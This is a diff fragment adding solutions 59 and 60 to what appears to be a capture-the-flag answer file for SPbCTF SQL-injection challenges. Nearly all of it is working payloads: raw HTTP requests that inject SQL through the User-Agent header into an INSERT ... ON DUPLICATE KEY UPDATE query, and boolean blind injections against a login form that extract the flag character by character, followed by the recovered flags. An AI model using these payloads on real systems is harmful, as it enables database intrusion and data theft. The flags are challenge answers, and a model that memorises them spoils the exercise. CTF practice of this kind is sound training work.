@@ -1320,3 +1320,64 @@ IF(ASCII(SUBSTR((SELECT flag FROM flag),9,1))>100, SLEEP(5), 0)
 ---
 
 spbctf{g00d_j0B_Res1d3ntS133p3r}
+
+59) http://kslweb1.spb.ctf.su/sqli/time2/
+
+GET /sqli/time2/ HTTP/1.1
+Host: kslweb1.spb.ctf.su
+User-Agent: WWW', '46.17.22.33') ON DUPLICATE KEY UPDATE time = NOW(), useragent = 'WWW' -- %20
+
+->
+
+Query: INSERT INTO logs (time, useragent, ip) VALUES (NOW(), 'WWW', '46.17.22.33') ON DUPLICATE KEY UPDATE time = NOW(), useragent = 'WWW' -- %20', '46.17.22.33') ON DUPLICATE KEY UPDATE time = NOW(), useragent = 'WWW', '46.17.22.33') ON DUPLICATE KEY UPDATE time = NOW(), useragent = 'WWW' -- %20'
+
+Result:
+2 affected rows
+
+---
+
+GET /sqli/time2/ HTTP/1.1
+Host: kslweb1.spb.ctf.su
+User-Agent: WWW', (SELECT flag FROM flag)) ON DUPLICATE KEY UPDATE time = NOW(), useragent = 'WWW' -- %20
+
+->
+
+spbctf{5e6ddd2037fc9
+
+---
+
+GET /sqli/time2/ HTTP/1.1
+Host: kslweb1.spb.ctf.su
+User-Agent: WWW', (SUBSTR((SELECT flag FROM flag),10,20))) ON DUPLICATE KEY UPDATE time = NOW(), useragent = 'WWW' -- %20
+
+->
+
+6ddd2037fc965ff9d492
+
+---
+
+GET /sqli/time2/ HTTP/1.1
+Host: kslweb1.spb.ctf.su
+User-Agent: WWW', (SUBSTR((SELECT flag FROM flag),20,20))) ON DUPLICATE KEY UPDATE time = NOW(), useragent = 'WWW' -- %20
+
+->
+
+965ff9d492bb6c3}
+
+---
+
+spbctf{5e6ddd2037fc965ff9d492bb6c3}
+
+60) http://kslweb1.spb.ctf.su/sqli/login/
+
+admin' AND (SUBSTR((SELECT flag FROM flag),1,1))=6 -- 
+admin' AND (SUBSTR((SELECT flag FROM flag),2,1))=9 -- 
+admin' AND (SUBSTR((SELECT flag FROM flag),3,1))=0 -- 
+admin' AND (SUBSTR((SELECT flag FROM flag),4,1))=8 -- 
+admin' AND (SUBSTR((SELECT flag FROM flag),5,1))=8 -- 
+admin' AND (SUBSTR((SELECT flag FROM flag),6,1))=1 -- 
+admin' AND (SUBSTR((SELECT flag FROM flag),7,1))=9 -- 
+
+->
+
+spbctf{6908819}
